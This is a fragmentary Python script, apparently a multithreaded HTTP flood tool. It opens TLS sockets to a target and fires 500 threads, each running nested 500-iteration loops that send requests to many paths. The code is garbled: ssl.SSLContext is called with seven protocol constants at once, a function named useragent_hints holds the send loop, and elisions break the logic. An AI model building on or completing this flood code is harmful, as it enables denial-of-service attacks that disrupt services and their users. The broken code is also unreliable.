import threading,socket,ssl,random,string,struct,sys,requests
...
def sock_build(target):
   ...
   return ssl.SSLContext(ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1_1,ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_SSLv23).wrap_socket(s,server_hostname=target['host'])

def useragent_hints(user_agent):
   import re
   ...
   for _ in range(500):
     try:
        for _ in range(500):
           ...
           s.sendall(a)
           data = s.read()
           options = reply_recheck(data); options_cached = ''
           for a in paths:
              packet_raw = [a,meth]
              pkt_set = pkt(packet_raw,options)
              s.sendall(pkt_set)
              data = s.read()
              options_cached = reply_recheck(data)
...
def Rapid(target,meth,paths):
  try:
    for _ in range(500):
     threading.Thread(target=Rapid_sender,args=(target,sock_build(target),[target['uri'],meth],paths)).start()
...
paths = [path if path.startswith('/') or path.startswith('mailto:') else '/' + path for path in list(set(paths))]
